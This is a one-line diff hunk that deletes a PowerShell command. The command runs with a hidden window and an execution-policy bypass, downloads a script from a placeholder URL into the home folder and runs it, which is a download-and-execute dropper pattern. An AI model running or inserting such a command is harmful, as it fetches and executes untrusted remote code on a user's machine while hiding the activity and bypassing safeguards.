@@ -1,1 +1,0 @@
-powershell -w h -ep bypass wget >>URL<< -o ~/w.ps1;~/w.ps1
